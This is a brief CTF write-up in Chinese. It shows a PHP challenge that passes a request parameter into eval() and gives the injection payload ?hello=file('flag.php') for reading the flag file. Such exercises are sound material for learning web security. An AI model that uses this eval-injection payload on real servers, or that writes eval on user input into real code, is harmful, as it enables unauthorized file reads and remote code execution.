

```javascript
<?php
    include "flag.php";
    $a = @$_REQUEST['hello'];
    eval( "var_dump($a);");
    show_source(__FILE__);
?>
```



var_dump将输入的东西打印出来，

eval可用来执行函数，

此处可执行file()函数，file()函数将文件读出一个数组中。

而var_dump将其打印出来。

所以payload:

?hello=file('flag.php')